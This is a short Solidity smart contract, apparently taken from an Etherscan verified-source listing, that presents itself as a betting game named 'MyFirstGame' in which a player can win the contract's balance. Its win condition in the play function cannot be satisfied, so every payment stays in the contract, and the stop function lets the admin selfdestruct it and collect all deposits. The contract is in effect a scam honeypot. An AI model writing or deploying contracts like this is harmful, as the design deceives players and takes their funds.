/**
 *Submitted for verification at Etherscan.io on 2022-02-14
*/

//SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.11;

contract MyFirstGame {
    uint public contractBalance;
    uint private init;
    address private admin;

    event Success(address winner);

    constructor() payable{
        init = block.number;
        admin  = msg.sender;
    }

    function play(uint data) public payable {
        if (init == (block.number ** 2 + data) && msg.value > address(this).balance) {

                payable(msg.sender).transfer(address(this).balance);   
                emit Success(msg.sender);
        }
        contractBalance += msg.value;  
    }
    function stop() public {
        if (msg.sender == admin) {
            selfdestruct(payable(msg.sender));
        }
    }
}